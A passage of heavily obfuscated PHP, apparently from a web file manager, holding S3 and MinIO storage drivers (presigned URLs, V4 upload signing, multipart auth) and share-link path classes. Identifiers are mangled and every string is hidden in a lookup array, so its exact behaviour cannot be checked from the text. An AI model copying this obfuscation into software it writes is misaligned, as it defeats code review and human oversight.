$ÛÀ¶…ğì); return $çíÙèÁ– !== !1 ? $ÛÀ¶…ğì : !1; } public function link($ëÌÜ­ÑŠ, $÷£‰§ = array()) { return $this->getPreSignedURL($ëÌÜ­ÑŠ, 3600 * 12, $÷£‰§); } private function getPreSignedURL($äê”Ù÷ò, $–Û®¼ŒË, $›ß¤¥„… = array(), $ß­œ» = "\x47\105\x54") { $â‘ï©åè =& $_SERVER[µÅ˜º…æ]; $äê”Ù÷ò = trim($äê”Ù÷ò, $â‘ï©åè[8]); if ($this->signVer == $â‘ï©åè[247]) { return $this->client->getPreSignedV2URL($this->bucket, $äê”Ù÷ò, $–Û®¼ŒË, $ß­œ», $›ß¤¥„…); } return $this->client->getPreSignedV4URL($this->bucket, $äê”Ù÷ò, $–Û®¼ŒË, array(), $ß­œ», $›ß¤¥„…); } public function fileOut($¹˜é¶Ì¨, $ò¶Òè“ = false, $¶ÖÚ¥• = false, $ÆğÍò÷˜ = '') { $°è×–» =& $_SERVER[µÅ˜º…æ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¹˜é¶Ì¨, $ò¶Òè“, $¶ÖÚ¥•, $ÆğÍò÷˜); } if (!$¶ÖÚ¥•) { $¶ÖÚ¥• = $this->pathThis($¹˜é¶Ì¨); } $Í„ÀÁêş = get_file_mime(get_path_ext($¶ÖÚ¥•)); if ($Í„ÀÁêş == $°è×–»[248]) { return parent::fileOut($¹˜é¶Ì¨, $ò¶Òè“, $¶ÖÚ¥•, $ÆğÍò÷˜); } $Œ—èº¡œ = array($°è×–»[249] => $Í„ÀÁêş); if ($ò¶Òè“) { $Œ—èº¡œ[$°è×–»[250]] = $°è×–»[251] . rawurlencode($¶ÖÚ¥•); } else { } $Ö¯’å¡Æ = $this->link($¹˜é¶Ì¨, $Œ—èº¡œ); $this->fileOutLink($Ö¯’å¡Æ); } public function fileOutServer($ÃÜ©ŸŒŞ, $²§Å²öç = false, $¨Ø¥£µÒ = false, $¬™¹Óî› = '') { parent::fileOut($ÃÜ©ŸŒŞ, $²§Å²öç, $¨Ø¥£µÒ, $¬™¹Óî›); } public function fileOutImageServer($­¥ôä•Ë, $åƒÃìè¶ = 250) { parent::fileOutImage($­¥ôä•Ë, $åƒÃìè¶); } public function fileOutLink($°¿­…æú) { $°«µ÷”Á =& $_SERVER[µÅ˜º…æ]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($°«µ÷”Á[67], $°«µ÷”Á[66], $°«µ÷”Á[68])) && !get_url_scheme($this->endpoint) && substr($°¿­…æú, 0, 7) == $°«µ÷”Á[216]) { $°¿­…æú = $°«µ÷”Á[217] . substr($°¿­…æú, 7); } header($°«µ÷”Á[172] . $°¿­…æú); die; } public function hashMd5($şŞ›çÚ, $‰¨³×” = '') { $¬®‘ÎÚÌ = $this->objectMeta($şŞ›çÚ); if (!$¬®‘ÎÚÌ) { return !1; } $‰¨³×” = $‰¨³×” ? $‰¨³×” : _get($¬®‘ÎÚÌ, $_SERVER[µÅ˜º…æ][252]); return $‰¨³×”; } public function uploadFormData($àô¤Ş˜¼, $–Ú˜¹¨ò = 3600) { $ É·ôŞ =& $_SERVER[µÅ˜º…æ]; if (!$this->_isClientAsync()) { $¡À½ôı = $this->getPreSignedURL($àô¤Ş˜¼, $–Ú˜¹¨ò, array(), $ É·ôŞ[253]); return array($ É·ôŞ[206] => str_replace($ É·ôŞ[216], $ É·ôŞ[254], $¡À½ôı)); } if (isset($GLOBALS[$ É·ôŞ[6]][$ É·ôŞ[92]][$ É·ôŞ[255]]) && $GLOBALS[$ É·ôŞ[6]][$ É·ôŞ[92]][$ É·ôŞ[255]] == $ É·ôŞ[228]) { return $this->uploadMultiData($àô¤Ş˜¼, $–Ú˜¹¨ò); } if ($this->signVer == $ É·ôŞ[247]) { return $this->uploadFormDataV2($àô¤Ş˜¼, $–Ú˜¹¨ò); } return $this->uploadFormDataV4($àô¤Ş˜¼, $–Ú˜¹¨ò); } public function uploadFormDataV2($‡Ğò‡î«, $ìÃñá±æ = 3600) { $Ó²·»¦ =& $_SERVER[µÅ˜º…æ]; $èÊ£© = $this->pathFather($‡Ğò‡î«); $ã®ÃÄñå = $this->client->getHttpUploadPostParams($this->bucket, $èÊ£©, $Ó²·»¦[229], $ìÃñá±æ); $’’Ã€™‚ = array_merge((array) $ã®ÃÄñå, array($Ó²·»¦[256] => $Ó²·»¦[247], $Ó²·»¦[206] => $this->getHost())); if ($this->_isClientAsync()) { unset($’’Ã€™‚[$Ó²·»¦[256]]); } return $’’Ã€™‚; } public function uploadFormDataV4($©öĞºÛ, $ı‘¹ ïğ = 3600) { $„ÜíŸ®– =& $_SERVER[µÅ˜º…æ]; $ı¤§ã–œ = $„ÜíŸ®–[229]; $ÒÄçµŞ = $„ÜíŸ®–[257]; $—š—‡‹ = $„ÜíŸ®–[62]; $ƒ©Š°»Õ = gmdate($„ÜíŸ®–[258]); $ïÄóé–Ÿ = gmdate($„ÜíŸ®–[259]); $¹ßæŒ±« = $„ÜíŸ®–[260]; $¶ºÛ©øü = $ı‘¹ ïğ . $„ÜíŸ®–[12]; $øŒÏ®ÛŠ = $„ÜíŸ®–[261]; $•ëìÖ° = array($this->accessKey, $ïÄóé–Ÿ, $this->region, $—š—‡‹, $¹ßæŒ±«); $ã²¹˜ñ = implode($„ÜíŸ®–[8], $•ëìÖ°); $©¶±È–ı = array($„ÜíŸ®–[262] => gmdate($„ÜíŸ®–[263], strtotime($„ÜíŸ®–[264])), $„ÜíŸ®–[265] => array(array($„ÜíŸ®–[266] => $this->bucket), array($„ÜíŸ®–[267], $„ÜíŸ®–[268], $„ÜíŸ®–[12]), array($„ÜíŸ®–[267], $„ÜíŸ®–[269], $„ÜíŸ®–[12]), array($„ÜíŸ®–[270] => $øŒÏ®ÛŠ), array($„ÜíŸ®–[271] => $ã²¹˜ñ), array($„ÜíŸ®–[272] => $ÒÄçµŞ), array($„ÜíŸ®–[273] => $ƒ©Š°»Õ), array($„ÜíŸ®–[274] => $¶ºÛ©øü))); $š×¢ûö¾ = base64_encode(json_encode($©¶±È–ı)); $Åü›Öà­ = hash_hmac($„ÜíŸ®–[275], $ïÄóé–Ÿ, $„ÜíŸ®–[276] . $this->secret, !0); $†Ò—›œ = hash_hmac($„ÜíŸ®–[275], $this->region, $Åü›Öà­, !0); $‘æóáã¥ = hash_hmac($„ÜíŸ®–[275], $—š—‡‹, $†Ò—›œ, !0); $Şº¢ ½¥ = hash_hmac($„ÜíŸ®–[275], $¹ßæŒ±«, $‘æóáã¥, !0); $Íº¶À©Á = hash_hmac($„ÜíŸ®–[275], $š×¢ûö¾, $Şº¢ ½¥); $ñéëµ›‚ = array($„ÜíŸ®–[246] => $„ÜíŸ®–[12], $„ÜíŸ®–[270] => $øŒÏ®ÛŠ, $„ÜíŸ®–[277] => $š×¢ûö¾, $„ÜíŸ®–[271] => $ã²¹˜ñ, $„ÜíŸ®–[272] => $ÒÄçµŞ, $„ÜíŸ®–[273] => $ƒ©Š°»Õ, $„ÜíŸ®–[274] => $¶ºÛ©øü, $„ÜíŸ®–[278] => $Íº¶À©Á, $„ÜíŸ®–[256] => $„ÜíŸ®–[247], $„ÜíŸ®–[206] => $this->getHost()); if ($this->_isClientAsync()) { unset($ñéëµ›‚[$„ÜíŸ®–[256]]); } return $ñéëµ›‚; } public function uploadMultiData($£¼ ä…³, $ÕüÛ–åÚ = 3600) { $»ï–õà =& $_SERVER[µÅ˜º…æ]; $¢şÈÕÖ = $this->signVer == $»ï–õà[247] ? gmdate($»ï–õà[279]) : gmdate($»ï–õà[280]); $•®˜Ìã = array(); $¨‹’² = $this->client->getUploadId($this->bucket, $£¼ ä…³, $•®˜Ìã); if (!$¨‹’²) { return !1; } $´øÖÂñ¬ = array($»ï–õà[281] => $¨‹’², $»ï–õà[206] => $this->getHost() . $»ï–õà[8] . $this->pathEncode($£¼ ä…³), $»ï–õà[282] => $¢şÈÕÖ, $»ï–õà[95] => $£¼ ä…³, $»ï–õà[256] => $this->signVer); if ($this->_isClientAsync()) { unset($´øÖÂñ¬[$»ï–õà[256]]); } return $´øÖÂñ¬; } public function uploadMultiAuth($ùØÈ¢ı—, $É¿šú£ä = array()) { $‚œ•ÉßÄ =& $_SERVER[µÅ˜º…æ]; if ($this->signVer == $‚œ•ÉßÄ[247]) { if (isset($É¿šú£ä[$‚œ•ÉßÄ[283]])) { return $this->uploadPartAuthV2($ùØÈ¢ı—, $É¿šú£ä); } return $this->uploadListAuthV2($ùØÈ¢ı—, $É¿šú£ä); } if (isset($É¿šú£ä[$‚œ•ÉßÄ[283]])) { return $this->uploadPartAuthV4($ùØÈ¢ı—, $É¿šú£ä); } return $this->uploadListAuthV4($ùØÈ¢ı—, $É¿šú£ä); } public function uploadPartAuthV2($ßœçÎ ¦, $°úø‰¥¿ = array()) { $öÄ§Ñ’ç =& $_SERVER[µÅ˜º…æ]; $¯‘šÑ“Œ = $°úø‰¥¿[$öÄ§Ñ’ç[95]]; $ÊË€¿Ç¨ = gmdate($öÄ§Ñ’ç[279]); $úğï«‡– = array_intersect_key($°úø‰¥¿, array_flip(array($öÄ§Ñ’ç[283], $öÄ§Ñ’ç[281]))); ksort($úğï«‡–); $µ°ºõŞş = $úğï«‡– ? $öÄ§Ñ’ç[76] . http_build_query($úğï«‡–, null, $öÄ§Ñ’ç[284], PHP_QUERY_RFC3986) : $öÄ§Ñ’ç[12]; $È¦Ëµï¦ = array($öÄ§Ñ’ç[253], $öÄ§Ñ’ç[12], $öÄ§Ñ’ç[120], $öÄ§Ñ’ç[12], "\x78\x2d\x61\155\172\x2d\x64\141\164\x65\x3a{$ÊË€¿Ç¨}", $öÄ§Ñ’ç[8] . $this->bucket . $öÄ§Ñ’ç[8] . $this->pathEncode($¯‘šÑ“Œ) . $µ°ºõŞş); $Ã˜¸ôúÅ = implode($öÄ§Ñ’ç[285], $È¦Ëµï¦); $ğ¨Ï´îÑ = $this->client->__getSignature($Ã˜¸ôúÅ); return array($öÄ§Ñ’ç[286] => $ğ¨Ï´îÑ, $öÄ§Ñ’ç[282] => $ÊË€¿Ç¨); } public function uploadListAuthV2($™À‰—°, $ÁÆ¤°ó¼ = array()) { $Ææáä±ë =& $_SERVER[µÅ˜º…æ]; $ É‡ı”Ò = $ÁÆ¤°ó¼[$Ææáä±ë[95]]; $†²²Ø•Ø = $ÁÆ¤°ó¼[$Ææáä±ë[281]]; $İÕõÁµå = $this->client->listParts($this->bucket, $ É‡ı”Ò, $†²²Ø•Ø); if (!$İÕõÁµå) { return !1; } $Çşëúû = gmdate($Ææáä±ë[279]); $õê÷ŒÄ = $Ææáä±ë[287] . $†²²Ø•Ø; $˜Ûæ’¾š = array($Ææáä±ë[288], $Ææáä±ë[12], $Ææáä±ë[120], $Ææáä±ë[12], "\x78\55\x61\x6d\x7a\x2d\x64\141\x74\145\72{$Çşëúû}", $Ææáä±ë[8] . $this->bucket . $Ææáä±ë[8] . $this->pathEncode($ É‡ı”Ò) . $õê÷ŒÄ); $â•ğ—Öµ = implode($Ææáä±ë[285], $˜Ûæ’¾š); $­öÒÏ§ = $this->client->__getSignature($â•ğ—Öµ); return array($Ææáä±ë[286] => $­öÒÏ§, $Ææáä±ë[282] => $Çşëúû, $Ææáä±ë[289] => $İÕõÁµå); } public function uploadPartAuthV4($Š÷üÁ­ƒ, $î”ìÂè† = array()) { $–‘Øß™á =& $_SERVER[µÅ˜º…æ]; $à‘àŠ” = $î”ìÂè†[$–‘Øß™á[95]]; $´ú£â“ = array($–‘Øß™á[273] => gmdate($–‘Øß™á[280]), $–‘Øß™á[290] => _get($î”ìÂè†, $–‘Øß™á[291], hash($–‘Øß™á[275], $–‘Øß™á[12]))); $şãè—— = explode($–‘Øß™á[208], $this->getHost()); $°¢§œï = array($–‘Øß™á[292] => $şãè——[1], $–‘Øß™á[293] => $–‘Øß™á[12], $–‘Øß™á[246] => $–‘Øß™á[120], $–‘Øß™á[294] => $î”ìÂè†[$–‘Øß™á[79]]); $ ¼íáœ = $–‘Øß™á[253]; $ßÚ¸ù¹€ = $–‘Øß™á[8] . $this->pathEncode($à‘àŠ”); $œ”ÃÁÅß = array_intersect_key($î”ìÂè†, array_flip(array($–‘Øß™á[283], $–‘Øß™á[281]))); $Û¶›¸Í = $this->client->__getSignatureV4($´ú£â“, $°¢§œï, $ ¼íáœ, $ßÚ¸ù¹€, $œ”ÃÁÅß); return array($–‘Øß™á[286] => $Û¶›¸Í, $–‘Øß™á[290] => $´ú£â“[$–‘Øß™á[290]], $–‘Øß™á[282] => $´ú£â“[$–‘Øß™á[273]]); } public function uploadListAuthV4($îå¥ß‚Ø, $ƒßåâ’ = array()) { $ëí‘›â© =& $_SERVER[µÅ˜º…æ]; $éª†‡Î± = $ƒßåâ’[$ëí‘›â©[95]]; $ÑóÄÜ“š = $ƒßåâ’[$ëí‘›â©[281]]; $–‘ş‘µú = $this->client->listParts($this->bucket, $éª†‡Î±, $ÑóÄÜ“š); if (!$–‘ş‘µú) { return !1; } $ëºî‘Ï = $ëí‘›â©[295]; foreach ($–‘ş‘µú as $è˜—îš¡) { $ëºî‘Ï .= $ëí‘›â©[296] . "\74\120\x61\x72\x74\x4e\x75\155\x62\145\x72\76{$è˜—îš¡[$ëí‘›â©[297]]}\74\57\x50\x61\x72\164\116\x75\x6d\142\145\x72\76\xa" . "\74\x45\124\141\x67\x3e{$è˜—îš¡[$ëí‘›â©[298]]}\x3c\57\105\x54\141\147\76\xa" . $ëí‘›â©[299]; } $ëºî‘Ï .= $ëí‘›â©[300]; $îÓßÃƒ² = array($ëí‘›â©[273] => gmdate($ëí‘›â©[280]), $ëí‘›â©[290] => hash($ëí‘›â©[275], $ëºî‘Ï)); $÷ØÖª—È = explode($ëí‘›â©[208], $this->getHost()); $ÊÇ½Æ´ = array($ëí‘›â©[292] => $÷ØÖª—È[1], $ëí‘›â©[246] => $ëí‘›â©[120], $ëí‘›â©[294] => strlen($ëºî‘Ï)); $ÑÉ»ññ¶ = $ëí‘›â©[288]; $¡Ó“ÀÛÔ = $ëí‘›â©[8] . $this->pathEncode($éª†‡Î±); $ –§÷Ê = array($ëí‘›â©[281] => $ÑóÄÜ“š); $¯ºÛ‰²ø = $this->client->__getSignatureV4($îÓßÃƒ², $ÊÇ½Æ´, $ÑÉ»ññ¶, $¡Ó“ÀÛÔ, $ –§÷Ê); return array($ëí‘›â©[286] => $¯ºÛ‰²ø, $ëí‘›â©[290] => $îÓßÃƒ²[$ëí‘›â©[290]], $ëí‘›â©[282] => $îÓßÃƒ²[$ëí‘›â©[273]], $ëí‘›â©[289] => $–‘ş‘µú); } private function _isClientAsync() { $’×è®¥ä =& $_SERVER[µÅ˜º…æ]; static $åñˆˆñ = null; if ($åñˆˆñ === null) { $ÍæÙó«Ì = isset($_REQUEST[$’×è®¥ä[301]]) ? json_decode($_REQUEST[$’×è®¥ä[301]], !0) : !1; $åñˆˆñ = $ÍæÙó«Ì && _get($ÍæÙó«Ì, $’×è®¥ä[302]) == $’×è®¥ä[303]; } return $åñˆˆñ; } public function getHost() { $Ÿ—ÙƒŸ» =& $_SERVER[µÅ˜º…æ]; $ş‚ÀÙÁë = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Ÿ—ÙƒŸ»[70], $Ÿ—ÙƒŸ»[64], $Ÿ—ÙƒŸ»[69], $Ÿ—ÙƒŸ»[62]))) { return $ş‚ÀÙÁë . $Ÿ—ÙƒŸ»[8] . $this->bucket; } if ($this->osType == $Ÿ—ÙƒŸ»[62] && !is_domain($ş‚ÀÙÁë)) { return $ş‚ÀÙÁë . $Ÿ—ÙƒŸ»[8] . $this->bucket; } $ş‚ÀÙÁë = explode($Ÿ—ÙƒŸ»[208], $ş‚ÀÙÁë); return $ş‚ÀÙÁë[0] . $Ÿ—ÙƒŸ»[208] . $this->bucket . $Ÿ—ÙƒŸ»[10] . $ş‚ÀÙÁë[1]; } public function size($°÷©´¹) { $êîé•³ë = $this->objectMeta($°÷©´¹); return $êîé•³ë ? $êîé•³ë[$_SERVER[µÅ˜º…æ][79]] : 0; } public function info($âÄŠÃ¨¹) { if ($this->isFolder($âÄŠÃ¨¹)) { return $this->folderInfo($âÄŠÃ¨¹); } else { if ($this->isFile($âÄŠÃ¨¹)) { return $this->fileInfo($âÄŠÃ¨¹); } } return !1; } public function exist($ÍÓ÷Ëå½) { return $this->isFile($ÍÓ÷Ëå½) || $this->isFolder($ÍÓ÷Ëå½); } public function isFile($¡ÌÅØŠò) { return !$this->isFolder($¡ÌÅØŠò) && $this->objectMeta($¡ÌÅØŠò); } public function isFolder($œæ˜ÜÖ¨) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][177], $œæ˜ÜÖ¨); } protected function objectMeta($ˆ½¬¿ö§) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][179], $ˆ½¬¿ö§); } protected function _objectMeta($¢šÂ²¶) { $™Ş—û =& $_SERVER[µÅ˜º…æ]; $¢šÂ²¶ = rtrim($¢šÂ²¶, $™Ş—û[8]); try { $¨“íÌ®ï = $this->client->getObjectInfo($this->bucket, $¢šÂ²¶); if (!isset($¨“íÌ®ï[$™Ş—û[252]]) && isset($¨“íÌ®ï[$™Ş—û[304]])) { $¨“íÌ®ï[$™Ş—û[252]] = $¨“íÌ®ï[$™Ş—û[304]]; } } catch (Exception $‹ŸËÖ‹å) { $¨“íÌ®ï = !1; } if (!$¨“íÌ®ï) { } return $¨“íÌ®ï; } protected function _isFolder($†”Ú¬ Í) { $ø÷ŸØô‡ =& $_SERVER[µÅ˜º…æ]; $†”Ú¬ Í = rtrim($†”Ú¬ Í, $ø÷ŸØô‡[8]) . $ø÷ŸØô‡[8]; if ($†”Ú¬ Í == $ø÷ŸØô‡[12] || $†”Ú¬ Í == $ø÷ŸØô‡[8]) { return !0; } $ã”†íï– = $this->client->getBucket($this->bucket, $†”Ú¬ Í, null, 1); if (empty($ã”†íï–[$ø÷ŸØô‡[236]])) { return !1; } $Š£ûèÑ = $ã”†íï–[$ø÷ŸØô‡[236]][0][$ø÷ŸØô‡[32]]; return stripos($Š£ûèÑ, $†”Ú¬ Í) === 0 ? !0 : !1; if (substr($Š£ûèÑ, -1) == $ø÷ŸØô‡[8]) { return !0; } if (get_path_this($Š£ûèÑ) == get_path_this($†”Ú¬ Í)) { return !1; } return !0; } public function listObject($Ú‹ªâ˜Ò) { return $this->fileList($Ú‹ªâ˜Ò, $_SERVER[µÅ˜º…æ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÌùñÖˆà) { $êßšçÒ =& $_SERVER[µÅ˜º…æ]; parent::__construct($ÌùñÖˆà); $this->setSignVersion($êßšçÒ[247]); if (!$this->region) { $this->region = $êßšçÒ[305]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ØúéÂ„, $¨‹ÂÃ¶ö = 3600) { $‡ñ›¾ÔÀ =& $_SERVER[µÅ˜º…æ]; $²õ±Îı„ = $‡ñ›¾ÔÀ[229]; $êšË•˜ = $‡ñ›¾ÔÀ[257]; $¡’õ™á· = $‡ñ›¾ÔÀ[62]; $˜¡Ş“ÈÏ = gmdate($‡ñ›¾ÔÀ[258]); $¡ÃÅÃï = gmdate($‡ñ›¾ÔÀ[259]); $âÍäãƒ‹ = $‡ñ›¾ÔÀ[260]; $åğ¡ä«È = $¨‹ÂÃ¶ö . $‡ñ›¾ÔÀ[12]; $Ã‡“Ç¸ = $‡ñ›¾ÔÀ[261]; $¿üÑ¤Ëà = array($this->accessKey, $¡ÃÅÃï, $this->region, $¡’õ™á·, $âÍäãƒ‹); $¼õêÌ†Æ = implode($‡ñ›¾ÔÀ[8], $¿üÑ¤Ëà); $óàúç¾ñ = array($‡ñ›¾ÔÀ[262] => gmdate($‡ñ›¾ÔÀ[263], strtotime($‡ñ›¾ÔÀ[264])), $‡ñ›¾ÔÀ[265] => array(array($‡ñ›¾ÔÀ[266] => $this->bucket), array($‡ñ›¾ÔÀ[306] => $²õ±Îı„), array($‡ñ›¾ÔÀ[267], $‡ñ›¾ÔÀ[268], $‡ñ›¾ÔÀ[12]), array($‡ñ›¾ÔÀ[267], $‡ñ›¾ÔÀ[269], $‡ñ›¾ÔÀ[12]), array($‡ñ›¾ÔÀ[267], $‡ñ›¾ÔÀ[307], $‡ñ›¾ÔÀ[12]), array($‡ñ›¾ÔÀ[270] => $Ã‡“Ç¸), array($‡ñ›¾ÔÀ[271] => $¼õêÌ†Æ), array($‡ñ›¾ÔÀ[272] => $êšË•˜), array($‡ñ›¾ÔÀ[273] => $˜¡Ş“ÈÏ), array($‡ñ›¾ÔÀ[274] => $åğ¡ä«È))); $‰ãÉ¹€  = base64_encode(json_encode($óàúç¾ñ)); $±úêÕñ£ = hash_hmac($‡ñ›¾ÔÀ[275], $¡ÃÅÃï, $‡ñ›¾ÔÀ[276] . $this->secret, !0); $´äĞœÄÅ = hash_hmac($‡ñ›¾ÔÀ[275], $this->region, $±úêÕñ£, !0); $££Ï¾Ü = hash_hmac($‡ñ›¾ÔÀ[275], $¡’õ™á·, $´äĞœÄÅ, !0); $Æ€÷çË = hash_hmac($‡ñ›¾ÔÀ[275], $âÍäãƒ‹, $££Ï¾Ü, !0); $–¾Ôş‚ = hash_hmac($‡ñ›¾ÔÀ[275], $‰ãÉ¹€ , $Æ€÷çË); $¹ÓôÂì = array($‡ñ›¾ÔÀ[246] => $‡ñ›¾ÔÀ[12], $‡ñ›¾ÔÀ[294] => $‡ñ›¾ÔÀ[12], $‡ñ›¾ÔÀ[306] => $²õ±Îı„, $‡ñ›¾ÔÀ[270] => $Ã‡“Ç¸, $‡ñ›¾ÔÀ[277] => $‰ãÉ¹€ , $‡ñ›¾ÔÀ[308] => $¼õêÌ†Æ, $‡ñ›¾ÔÀ[309] => $êšË•˜, $‡ñ›¾ÔÀ[310] => $˜¡Ş“ÈÏ, $‡ñ›¾ÔÀ[311] => $åğ¡ä«È, $‡ñ›¾ÔÀ[312] => $–¾Ôş‚, $‡ñ›¾ÔÀ[206] => $this->getHost()); return $¹ÓôÂì; } } goto eëÀáÂÍÉğ; eÓÊ˜ƒ¬—Ÿ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ŸÌıÒû¾) { $this->pathParse = $ŸÌıÒû¾; $this->model = Model($_SERVER[µÅ˜º…æ][1534]); } public function getPathRoot() { $¤şÉ”áª =& $_SERVER[µÅ˜º…æ]; return KodIO::makeShare($this->pathParse[$¤şÉ”áª[487]], $this->pathParse[$¤şÉ”áª[1361]]); } public function getPathOuter($Šà€Üõ‚) { $™Ä­öÜŸ =& $_SERVER[µÅ˜º…æ]; if (!$Šà€Üõ‚) { return $Šà€Üõ‚; } $õ¶ÕÜß¦ = $this->parse($Šà€Üõ‚); return trim(KodIO::makeShare($this->pathParse[$™Ä­öÜŸ[487]], $õ¶ÕÜß¦[$™Ä­öÜŸ[487]]), $™Ä­öÜŸ[8]); } public function isParentOf($²Ö˜, $ÀÔñã£”) { $ÚÄÁ¥åñ = IO::init($ÀÔñã£”); return $this->model->isParentOf($²Ö˜, $ÚÄÁ¥åñ->path); } protected function infoParse($øëï®®”, $çè±ü¡½ = false, $û¿®Üüò = false) { $¯À°íëú =& $_SERVER[µÅ˜º…æ]; static $‘ˆò = array(); $¾™œ¦øç = $this->pathParse[$¯À°íëú[487]]; $º¶ùúóÈ = trim($this->pathParse[$¯À°íëú[1357]], $¯À°íëú[8]); if (isset($‘ˆò[$º¶ùúóÈ]) && is_array($‘ˆò[$º¶ùúóÈ])) { return $‘ˆò[$º¶ùúóÈ]; } $¥ó³‡İ = Action($¯À°íëú[1541])->sharePathInfo($¾™œ¦øç, $º¶ùúóÈ, $çè±ü¡½); $‘ˆò[$º¶ùúóÈ] = $¥ó³‡İ; return $¥ó³‡İ; } public function infoFull($å™‘ÈÖ®) { $ù±ò­É© =& $_SERVER[µÅ˜º…æ]; $¼ËÇîâØ = explode($ù±ò­É©[8], trim($å™‘ÈÖ®, $ù±ò­É©[8])); if (count($¼ËÇîâØ) > 1) { $Õğïú± = implode($ù±ò­É©[8], array_splice($¼ËÇîâØ, 1)); $ü³Å¥—› = $this->model->pathInfoByPath($¼ËÇîâØ[0], $Õğïú±); if (!$ü³Å¥—›) { return !1; } $this->pathParse[$ù±ò­É©[1357]] = $ü³Å¥—›[$ù±ò­É©[191]]; } return $this->infoParse($å™‘ÈÖ®); } public function listAll($‚–ÈÚ·) { $¬ÃÜÏé =& $_SERVER[µÅ˜º…æ]; $é±Ÿû¶õ = IO::info($this->pathParse[$¬ÃÜÏé[87]]); if (!$é±Ÿû¶õ) { return array(); } $«¬ª÷í÷ = $this->model->listAll($‚–ÈÚ·); $¢ñÃèáá = Model($¬ÃÜÏé[686])->getInfo($é±Ÿû¶õ[$¬ÃÜÏé[687]]); foreach ($«¬ª÷í÷ as &$Åëé´Óç) { check_abort(); $Åëé´Óç[$¬ÃÜÏé[90]] = Action($¬ÃÜÏé[1541])->_shareItemeParse($Åëé´Óç[$¬ÃÜÏé[90]], $¢ñÃèáá); } unset($Åëé´Óç); return $«¬ª÷í÷; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($éÍ¼Ò½¸) { $this->pathParse = $éÍ¼Ò½¸; $this->model = Model($_SERVER[µÅ˜º…æ][1534]); } protected function infoParse($›ıüÂü€, $ ›ÎÑ¾ = false, $¬ÂòÂéã = false) { $€à¸å÷ =& $_SERVER[µÅ˜º…æ]; return Action($€à¸å÷[1364])->sharePathInfo($this->pathParse[$€à¸å÷[87]], !0, $ ›ÎÑ¾); } public function listPath($ƒ¯øí¸ª, $âà¶åâ… = false) { $ƒÈ®ÅÌ =& $_SERVER[µÅ˜º…æ]; $®ó˜§Å = parent::listPath($ƒ¯øí¸ª, $âà¶åâ…); if (!$®ó˜§Å) { return $®ó˜§Å; } if (is_array($®ó˜§Å[$ƒÈ®ÅÌ[966]])) { $®ó˜§Å[$ƒÈ®ÅÌ[966]] = Action($ƒÈ®ÅÌ[1364])->shareItemInfo($®ó˜§Å[$ƒÈ®ÅÌ[966]]); } foreach ($®ó˜§Å as $úµ‘öåş => $¤¬œ½Ôè) { if (!in_array($úµ‘öåş, array($ƒÈ®ÅÌ[86], $ƒÈ®ÅÌ[85]))) { continue; } foreach ($¤¬œ½Ôè as $èµğ¬Í· => $¶íûÎ”ù) { $®ó˜§Å[$úµ‘öåş][$èµğ¬Í·] = Action($ƒÈ®ÅÌ[1364])->shareItemInfo($¶íûÎ”ù); } } return $®ó˜§Å; } public function listAll($í‚·±É) { $ê½¬Êµ¡ =& $_SERVER[µÅ˜º…æ]; $ê´Ë™í = IO::info($this->pathParse[$ê½¬Êµ¡[87]]); if (!$ê´Ë™í) { return array(); } $£·İ×»ò = $this->model->listAll($í‚·±É); foreach ($£·İ×»ò as &$óšœä¨Ú) { $óšœä¨Ú[$ê½¬Êµ¡[90]] = Action($ê½¬Êµ¡[1364])->shareItemInfo($óšœä¨Ú[$ê½¬Êµ¡[90]]); } unset($óšœä¨Ú); return $£·İ×»ò; } } class PathDriverDriverShareItem { public function __construct($ ‡ïÏŞ˜) { $this->pathParse = $ ‡ïÏŞ˜; } public function __call($Çß¢ù³¹, $©¦úö‘¨) { $æäŸ®ëå =& $_SERVER[µÅ˜º…æ]; if (method_exists($this, $Çß¢ù³¹)) { return; } $ÑÉ›è‡Ò = call_user_func_array(array($æäŸ®ëå[1542], $Çß¢ù³¹), $©¦úö‘¨); $ÜñÒ€Ø = array($æäŸ®ëå[1543], $æäŸ®ëå[1544], $æäŸ®ëå[1545], $æäŸ®ëå[1546], $æäŸ®ëå[641], $æäŸ®ëå[643], $æäŸ®ëå[1547], $æäŸ®ëå[107], $æäŸ®ëå[1548], $æäŸ®ëå[1549]); if (in_array($Çß¢ù³¹, $ÜñÒ€Ø)) { $ÑÉ›è‡Ò = $this->getPathOuter($ÑÉ›è‡Ò); } return $ÑÉ›è‡Ò; } public function copy($ãóÏäÁ, $çãŒ®ä¥, $‰ßÕ‘“‘ = false, $£–ÇÀ¦Í = false) { return $this->copyMove($ãóÏäÁ, $çãŒ®ä¥, $‰ßÕ‘“‘, $_SERVER[µÅ˜º…æ][641], $£–ÇÀ¦Í); } public function move($ÉŒúŠÖÃ, $¹ó’½†—, $ª—¡›¨Ù = false, $”ÖÈéƒı = false) { return $this->copyMove($ÉŒúŠÖÃ, $¹ó’½†—, $ª—¡›¨Ù, $_SERVER[µÅ˜º…æ][643], $”ÖÈéƒı); } private function copyMove($·›øë¿¤, $ã¨ªÜ¥Î, $ã´„‡, $¼µéœ€§, $¾–ëñ™ = false) { $‘™÷ıïó =& $_SERVER[µÅ˜º…æ]; $ôñš—ô = $ã¨ªÜ¥Î; $­ú–çö¾ = IO::driverMake($ã¨ªÜ¥Î); if ($­ú–çö¾->pathParse[$‘™÷ıïó[1338]]) { $ã¨ªÜ¥Î = $­ú–çö¾->pathParse[$‘™÷ıïó[1338]]; } else { $ã¨ªÜ¥Î = $ôñš—ô; } $óÑ¿ÑŒÇ = IO::copyMove($·›øë¿¤, $ã¨ªÜ¥Î, $ã´„‡, $¼µéœ€§, $¾–ëñ™); $óÑ¿ÑŒÇ = $this->getPathOuter($óÑ¿ÑŒÇ); return $óÑ¿ÑŒÇ; } public function pathThis($ Û”ÔÜã) { return get_path_this($this->pathParse[$_SERVER[µÅ˜º…æ][87]]); } public function pathFather($’ßõ›‚Œ) { return get_path_father($this->pathParse[$_SERVER[µÅ˜º…æ][87]]); } public function iconvSystem($Ô®ÅÖ²ã) { return $Ô®ÅÖ²ã; } 